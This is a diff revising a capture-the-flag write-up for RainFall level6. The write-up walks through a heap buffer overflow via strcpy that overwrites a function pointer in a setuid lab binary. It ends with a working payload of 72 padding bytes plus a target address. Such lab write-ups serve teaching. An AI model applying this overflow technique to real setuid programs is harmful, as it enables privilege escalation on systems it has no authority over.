@@ -3,7 +3,7 @@
 Once logged in, you will see a binary `level6`.
 
 ```
-$ ssh level6@localhost -p 4242
+$ ssh level6@localhost -p 4444
 	  _____       _       ______    _ _
 	 |  __ \     (_)     |  ____|  | | |
 	 | |__) |__ _ _ _ __ | |__ __ _| | |
@@ -24,7 +24,9 @@ level6@localhost's password:
  System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level6/level6
-level6@RainFall:~$
+level6@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 level7 users 5274 Mar  6  2016 level6
 ```
 
 Let's run this and see what this does.
@@ -35,12 +37,11 @@ Segmentation fault (core dumped)
 level6@RainFall:~$
 level6@RainFall:~$ ./level6 adsfasdfa
 Nope
-level6@RainFall:~$
 ```
 
 Now, finally, it does something different from last levels.
 
-By taking a look at the binary, there are three functions we want to look at.
+Taking a look at the binary, there are three functions we want to look at.
 
 ```
 gdb-peda$ info functions
@@ -112,9 +113,9 @@ End of assembler dump.
 
 By analyzing the assembly (and decompiled C), we can tell the main function allocates memory on the heap with `malloc`, and calls function `m`. Our goal in this exploit is to call `n` instead.
 
-Remember the function `strcpy()` has vulnerability which enables us to change a program's functionality through a buffer overflow.
+Remember the function `strcpy` has vulnerability which enables us to change a program's functionality through a buffer overflow.
 
-Here we made the correct assumption that `malloc` stores values mostly next to one another plus some overhead. We found the correct memory location by writing a bit more to the copied argument than there was space available, thus overwriting the function pointer.
+Here we made the correct assumption that `malloc` stores values mostly next to one another plus some overhead. (We could have checked with GDB, but this worked first.) We found the correct memory location by writing a bit more to the copied argument than there was space available, thus overwriting the function pointer.
 
 ```
 level6@RainFall:~$ ./level6 $(python -c "print 'B'*64")
@@ -133,11 +134,11 @@ level6@RainFall:~$ ./level6 $(python -c "print 'B'*70")
 Nope
 level6@RainFall:~$ ./level6 $(python -c "print 'B'*71")
 Nope
-level6@RainFall:~$ ./level6 $(python -c "print 'B'*72") // XXX: try this
+level6@RainFall:~$ ./level6 $(python -c "print 'B'*72")
 Segmentation fault (core dumped)
 ```
 
-Now we just add on our desired value to be called, and voilà our completed exploit.
+Now we just add on our desired value to be called, and voilà our completed exploit. (Note that it crashes at `72` bytes because the `'\0'` overwrites part of the string we're interested in, which is why we're not modifying the below exploit to have an offset of `71`.)
 
 ```
 level6@RainFall:~$ ./level6 $(python -c "print 'B'*72 + '\x54\x84\x04\x08'")
